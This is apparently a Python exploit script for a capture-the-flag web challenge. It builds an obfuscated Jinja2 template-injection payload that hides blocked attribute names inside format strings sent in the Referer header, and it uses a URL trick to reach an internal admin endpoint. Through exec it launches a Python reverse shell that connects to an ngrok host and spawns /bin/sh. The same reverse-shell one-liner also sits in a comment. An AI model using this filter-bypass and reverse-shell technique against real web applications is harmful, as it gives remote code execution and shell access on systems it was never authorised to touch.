from urllib.parse import quote_plus

import requests

URL = "http://ctf.tcp1p.team:14012/"
# URL = "http://127.0.0.1:23678"

payload = (
	"{%print request"
	"|attr((request.referrer.split(request.referrer.split()|first % (65,))|last).split()|first % (95,95,116,95,95))"  # __init__
	"|attr((request.referrer.split(request.referrer.split()|first % (66,))|last).split()|first % (95,95,115,95,95))"  # __globals__
	"|attr((request.referrer.split(request.referrer.split()|first % (67,))|last).split()|first % (95,95,116,95,95))"  # __getitem__
	"((request.referrer.split(request.referrer.split()|first % (68,))|last).split()|first % (95,95,115,95,95))"  # __builtins__
	"|attr((request.referrer.split(request.referrer.split()|first % (67,))|last).split()|first % (95,95,116,95,95))"  # __getitem__
	"((request.referrer.split(request.referrer.split()|first % (69,))|last).split()|first % (120))"  # exec
	"(request.referrer.split(request.referrer.split()|first % (70,))|last % (111,111,111,65,70,95,69,67,95,69,65,34,34,34,34,34,34))"
	"%}"
)
# rev_shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",16908));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
print(
	requests.get(
		URL,
		params={"url": f"@LOCALHOST:1337/secret?admin={quote_plus(payload)}&a=/about/"},
		headers={
			"Accept-Encoding": None,
			"Referer": (
				"%c\t"
				"A%c%cini%c%c%c\t"
				"B%c%cglobal%c%c%c\t"
				"C%c%cgeti%cem%c%c\t"
				"D%c%cbuiltin%c%c%c\t"
				"Ee%cec\t"
				"Fimp%crt\tsocket,subpr%ccess\tas\tp,%cs\tas\to;s=socket.socket(socket.%c%c%cIN%cT,socket.SO%cK%cSTR%c%cM);s.connect((%c0.tcp.ngrok.io%c,16908));o.dup2(s.fileno(),0);o.dup2(s.fileno(),1);o.dup2(s.fileno(),2);p.call((%c/bin/sh%c,%c-i%c))"
			),
		},
		data="bruh",
	).text
)
